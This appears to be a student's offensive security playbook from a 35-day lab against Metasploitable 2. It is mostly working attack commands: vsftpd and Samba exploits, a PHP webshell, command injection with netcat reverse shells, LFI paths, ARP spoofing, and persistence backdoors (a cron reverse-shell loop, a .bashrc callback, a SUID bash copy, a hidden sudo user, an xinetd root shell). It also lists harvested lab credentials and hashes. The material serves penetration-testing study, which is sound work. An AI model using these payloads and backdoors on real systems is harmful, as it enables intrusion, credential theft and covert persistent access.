# 🔴 Offensive Security Playbook

> **Author:** Sulaman  
> **Course:** Offensive Security Foundations — Semester 1  
> **Duration:** 35 Days  
> **Target:** Metasploitable 2 (`192.168.100.46`)  
> **Attacker:** Kali Linux (`192.168.100.18`)  

---

## 📋 Table of Contents

1. [Reconnaissance](#-reconnaissance)
2. [Exploitation Methods](#-exploitation-methods)
3. [Post-Exploitation](#-post-exploitation)
4. [Persistence Mechanisms](#-persistence-mechanisms)
5. [Credential Harvesting](#-credential-harvesting)
6. [Privilege Escalation](#-privilege-escalation)
7. [Command Injection Delimiters](#-command-injection-delimiters)
8. [Reverse Shells & Bindshells](#-reverse-shells--bindshells)
9. [Useful Enumeration Commands](#-useful-enumeration-commands)
10. [Issues & Fixes](#-issues--fixes)
11. [Semester 1 Assessment](#-semester-1-assessment)
12. [Next Goals](#-next-goals)

---

## 🔍 Reconnaissance

### Tools
- `netdiscover` — Network discovery
- `nmap` — Port scanning & service enumeration
- `gobuster` — Web directory brute forcing
- `Wireshark` — Packet capture & analysis
- `netcat` — Manual service interaction
- `whatweb` — Technology fingerprinting
- `curl` — HTTP client

### Methodology
```bash
# Network discovery
sudo netdiscover -r 192.168.100.0/24

# Full port scan with version & OS detection
nmap -sS -sV -O 192.168.100.46
nmap -p- 192.168.100.46 > nmapfullscan.txt

# Web directory enumeration
gobuster dir -u http://192.168.100.46 -w /usr/share/wordlists/dirb/common.txt

# Technology fingerprinting
whatweb http://192.168.100.46

# Check headers
curl -I http://192.168.100.46
```

---

## 💥 Exploitation Methods

### 1. vsftpd 2.3.4 Backdoor (Port 21 → 6200)

**CVE:** CVE-2011-2523  
**Impact:** Root shell via smiley face trigger

```bash
# TERMINAL 1 — Trigger backdoor
nc 192.168.100.46 21
USER user:)
PASS irrelevant

# TERMINAL 2 — Collect root shell
nc 192.168.100.46 6200
whoami
# Output: root
```

---

### 2. xinetd Bindshell (Port 1524)

**Impact:** Root shell — always listening, no authentication

```bash
nc 192.168.100.46 1524
whoami
# Output: root
```

---

### 3. MITM Attack — ARP Spoofing

**Impact:** Sniff all traffic between victim and gateway

```bash
# Enable IP forwarding
sudo sysctl net.ipv4.ip_forward=1

# Poison victim (Metasploitable thinks Kali is the router)
sudo arpspoof -i eth0 -t 192.168.100.46 192.168.100.1

# Poison gateway (Router thinks Kali is Metasploitable)
sudo arpspoof -i eth0 -t 192.168.100.1 192.168.100.46

# Capture traffic
sudo tcpdump -i eth0 port 23 -w telnet_capture.pcap
```

| Protocol | Encrypted? | Credentials Visible? |
|:--|:--|:--|
| Telnet (23) | ❌ No | ✅ Yes — cleartext |
| SSH (22) | ✅ Yes | ❌ No — encrypted |

---

### 4. Samba SMB Exploitation (Port 139/445)

**CVE:** CVE-2007-2447  
**Impact:** Root shell via username map script injection

**Manual Enumeration:**
```bash
smbclient -L //192.168.100.46 -N
smbclient //192.168.100.46/tmp -N
enum4linux 192.168.100.46
```

**Metasploit Exploitation:**
```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.100.46
set LHOST 192.168.100.18
set PAYLOAD cmd/unix/reverse_netcat
exploit
```

---

### 5. WebDAV Webshell Upload (Port 80)

**Impact:** Web-based command execution via PHP webshell

**Step 1 — Create webshell on Kali:**
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

**Step 2 — Upload via cadaver:**
```bash
cadaver http://192.168.100.46/dav/
put shell2.php
quit
```

**Step 3 — Execute commands:**
```
http://192.168.100.46/dav/shell2.php?cmd=whoami
```

---

### 6. MySQL Root Access (Port 3306)

**Impact:** Full database access, file read/write via SQL

```bash
# Connect without password (skip SSL for old MySQL)
mysql -h 192.168.100.46 -u root --skip-ssl

# Enumerate
SHOW DATABASES;
USE mysql;
SHOW TABLES;
SELECT User, Password FROM mysql.user;

# Read system files
SELECT LOAD_FILE('/etc/passwd');

# Write a webshell via MySQL
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/tmp/backdoor2.php';
```

---

### 7. DVWA Command Injection (Port 80)

**Impact:** Remote code execution through vulnerable web form

**Low Security:**
```bash
# In the DVWA command injection form
127.0.0.1; whoami
127.0.0.1; nc -e /bin/bash 192.168.100.18 1234
```

**Kali listener:**
```bash
nc -lvnp 1234
```

**Security Level Bypasses:**

| Level | Blocked | Allowed |
|:--|:--|:--|
| Low | Nothing | `;`, `&&`, `\|\|`, `\|`, `$()` |
| Medium | `;`, `&&`, `$()` | `\|\|`, `\|` |
| High | Most operators | Requires advanced bypass |

---

### 8. LFI — Local File Inclusion

**Impact:** Read arbitrary system files through web parameter

```bash
# Read /etc/passwd
http://192.168.100.46/mutillidae/index.php?page=../../../../etc/passwd

# PHP filter wrapper (Base64 encoded)
http://192.168.100.46/mutillidae/index.php?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd

# Decode
echo "BASE64_OUTPUT" | base64 -d
```

---

### 9. Telnet Credential Sniffing (Port 23)

**Impact:** Capture cleartext credentials

```bash
telnet 192.168.100.46
# Login: msfadmin
# Password: msfadmin
```

All traffic visible in Wireshark → Follow TCP Stream.

---

## 🧹 Post-Exploitation

### Persistence Mechanisms

| # | Method | Command |
|:--|:--|:--|
| **1** | **New User with Sudo** | `useradd -m -s /bin/bash backdoor && echo "backdoor:Password123" \| chpasswd && usermod -aG sudo backdoor` |
| **2** | **SSH Key Injection** | Add your public key to `/root/.ssh/authorized_keys` and `/home/msfadmin/.ssh/authorized_keys` |
| **3** | **Cron Job Reverse Shell** | Add `@reboot root /var/tmp/.update.sh &` to `/etc/crontab` |
| **4** | **.bashrc Backdoor** | `echo 'nc -e /bin/bash 192.168.100.18 5555 &' >> /root/.bashrc` |
| **5** | **SUID Binary Plant** | `cp /bin/bash /var/tmp/.bash && chmod 4777 /var/tmp/.bash` |
| **6** | **Xinetd Backdoor** | Create service file in `/etc/xinetd.d/backdoor` on a custom port |

---

### SSH Key Persistence (Detailed)

```bash
# On Kali — Generate keypair
ssh-keygen -t rsa -f persistence_key -N ""

# On Metasploitable (as root) — Add public key
echo "ssh-rsa AAAAB3NzaC1yc2E... sulaman@kali" >> /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2E... sulaman@kali" >> /home/msfadmin/.ssh/authorized_keys

# Connect without password
ssh -i persistence_key -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.100.46
```

---

### Cron Job Reverse Shell (Detailed)

```bash
# On Metasploitable — Create persistence script
echo '#!/bin/bash' > /var/tmp/.update.sh
echo 'while true; do nc -e /bin/bash 192.168.100.18 5555 2>/dev/null; sleep 60; done' >> /var/tmp/.update.sh
chmod +x /var/tmp/.update.sh

# Schedule at reboot
echo "@reboot root /var/tmp/.update.sh &" >> /etc/crontab

# On Kali — Connect anytime
nc 192.168.100.46 5555
```

---

### Xinetd Backdoor (Detailed)

```bash
# On Metasploitable
echo "service backdoor
{
    type = UNLISTED
    port = 44444
    socket_type = stream
    wait = no
    user = root
    server = /bin/bash
    server_args = -i
}" > /etc/xinetd.d/backdoor

/etc/init.d/xinetd restart

# On Kali
nc 192.168.100.46 44444
# Output: root shell
```

---

## 🔑 Credential Harvesting

### Extracted Credentials

#### OWASP10 Database (Plaintext)
| Username | Password | Admin? |
|:--|:--|:--|
| admin | adminpass | TRUE |
| adrian | somepassword | TRUE |
| john | monkey | FALSE |
| jeremy | password | FALSE |
| bryce | password | FALSE |
| samurai | samurai | FALSE |
| jim | password | FALSE |
| bobby | password | FALSE |
| simba | password | FALSE |
| dreveil | password | FALSE |
| scotty | password | FALSE |
| cal | password | FALSE |
| kevin | 42 | FALSE |
| dave | set | FALSE |
| ed | pentest | FALSE |

#### DVWA Database (MD5 Hashes)
| Username | Hash | Cracked |
|:--|:--|:--|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

#### Shadow Backup (/var/backups/shadow.bak)
| Username | Hash | Cracked |
|:--|:--|:--|
| msfadmin | $1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/ | msfadmin |
| sys | $1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0 | batman |
| klog | $1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0 | 123456789 |
| service | $1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu// | service |

#### IRC Operator Passwords (/etc/unreal/unrealircd.conf)
| Password | Purpose |
|:--|:--|
| ILiKEopeRING1022 | IRC Operator |
| Sup3rSERViCE | IRC Link (connect/receive) |
| LovingTheKwlHost | IRC Host password |

#### Other Credentials
| Service | Username | Password |
|:--|:--|:--|
| MySQL | root | (blank) |
| MySQL | debian-sys-maint | (blank) |
| VNC (:0) | root | password |
| DVWA Config | root (MySQL) | (blank) |
| SSH Key | user@metasploitable | Key-based auth |

---

### Credential Search Commands

```bash
# Find backup files
find / -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null
find / -name "*.sql" 2>/dev/null | grep -v /var/lib/mysql
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | grep -v /proc

# Search for passwords in config files
grep -r "password" /etc/ --include="*.conf" 2>/dev/null
grep -r "passwd" /etc/ --include="*.conf" 2>/dev/null

# Read history files
cat /root/.bash_history
cat /home/*/.bash_history
cat /home/*/.mysql_history

# MySQL maintenance credentials
cat /etc/mysql/debian.cnf
```

---

## ⬆️ Privilege Escalation

### SUID Binary Exploitation (Nmap)

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Exploit old Nmap interactive mode
nmap --interactive
nmap> !sh
whoami
# Output: root
```

### Kernel Version
```
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```
Vulnerable to multiple kernel exploits (CVE-2010-1146, CVE-2009-2692, etc.)

---

## 💉 Command Injection Delimiters

| Operator | Function | Status (DVWA Medium) |
|:--|:--|:--|
| `;` | Execute next regardless | ❌ Filtered |
| `&&` | Execute if first succeeds | ❌ Filtered |
| `\|\|` | Execute if first fails | ✅ Works |
| `\|` | Pipe output | ✅ Works |
| `$()` | Command substitution | ❌ Filtered |

---

## 🐚 Reverse Shells & Bindshells

### Bindshell (Victim Listens)

```bash
# Method 1: Netcat
nc -lvp 4444 -e /bin/bash &

# Method 2: Named Pipe (when -e unavailable)
mkfifo /tmp/f; nc -lvp 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f

# Method 3: Python
python -c 'import socket,os,pty; s=socket.socket(); s.bind(("0.0.0.0",4444)); s.listen(1); c,a=s.accept(); os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2); pty.spawn("/bin/bash")'

# Method 4: Socat
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

### Reverse Shell (Victim Connects Back)

```bash
# On Kali
nc -lvnp 5555

# On Victim
nc -e /bin/bash 192.168.100.18 5555
```

---

## 🔎 Useful Enumeration Commands

| Artifact | Command | What To Look For |
|:--|:--|:--|
| Listening ports | `netstat -tulpn` | Unusual ports with /bin/sh or /bin/bash |
| Unusual processes | `ps aux` | Netcat in listen mode |
| Firewall rules | `iptables -L` | Newly opened ports |
| Cron jobs | `crontab -l`, `ls /etc/cron.*/` | Backdoors restarting via scheduler |
| SUID binaries | `find / -perm -4000 -type f 2>/dev/null` | Escalation vectors |
| World-writable files | `find / -writable -type f 2>/dev/null` | Hijackable scripts |
| SSH keys | `find / -name "authorized_keys" 2>/dev/null` | Password-less access |
| History files | `cat /home/*/.bash_history` | Passwords typed by mistake |

---

## ⚠️ Issues & Fixes

### vsftpd Session Drops

**Issue:** After sending USER and PASS, the FTP session immediately disconnects instead of staying connected.

```bash
┌──(sulaman㉿kali)-[~]
└─$ nc 192.168.100.46 21
220 (vsFTPd 2.3.4)
USER user:)
331 Please specify the password.
PASS irr

┌──(sulaman㉿kali)-[~]  # Connection dropped
```

**Fix:** Close both terminals completely and restart the attack. The backdoor still triggered — connect to port 6200 in Terminal 2.

---

### MySQL SSL Error

**Issue:** `ERROR 2026 (HY000): TLS/SSL error: wrong version number`

**Fix:** Use `--skip-ssl` flag:
```bash
mysql -h 192.168.100.46 -u root --skip-ssl
```

---

### SSH Legacy Algorithm Error

**Issue:** `Unable to negotiate with 192.168.100.46 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss`

**Fix:** Enable legacy algorithms:
```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.100.46
```

---

### URL Typed in Terminal Instead of Browser

**Issue:** `zsh: no such file or directory: http://...`

**Fix:** URLs go in browser address bar or with `curl`:
```bash
curl "http://192.168.100.46/dav/shell2.php?cmd=whoami"
```

---

### UnrealIRCd Backdoor — Error 451 (Not Registered)

**Issue:** Sending `AB;whoami` returns "You have not registered"

**Fix:** Register with IRC first:
```bash
NICK testuser
USER testuser 0 * :testuser
# Wait for welcome messages
AB;whoami
```

---

## 📝 Semester 1 Assessment

### Web Directory Enumeration Results

| Directory | Application |
|:--|:--|
| `/dav/` | WebDAV — file upload possible |
| `/phpMyAdmin/` | MySQL administration |
| `/twiki/` | TWiki CMS |
| `/test/` | Test directory |
| `/cgi-bin/` | CGI scripts |
| `phpinfo.php` | PHP configuration disclosure |

### Access Methods Discovered (9 Total)

1. vsftpd backdoor (CVE-2011-2523)
2. xinetd bindshell (port 1524)
3. Samba usermap (CVE-2007-2447)
4. Telnet cleartext access
5. SSH default credentials (msfadmin/msfadmin)
6. WebDAV PHP webshell upload
7. DVWA command injection
8. MySQL root no-password access
9. LFI file reading

---

## 🎯 Next Goals

| Goal | Detail |
|:--|:--|
| **Certification** | OSCP (OffSec) |
| **Platforms** | TryHackMe, HackTheBox, VulnHub, PentesterLab |
| **Skills to Learn** | Windows Privilege Escalation, Active Directory Attacks, Burp Suite, C2 Frameworks, Exploit Development |
| **Timeline** | 3 months intensive practice |

---
*Playbook generated from 35 days of hands-on penetration testing against Metasploitable 2.*
```



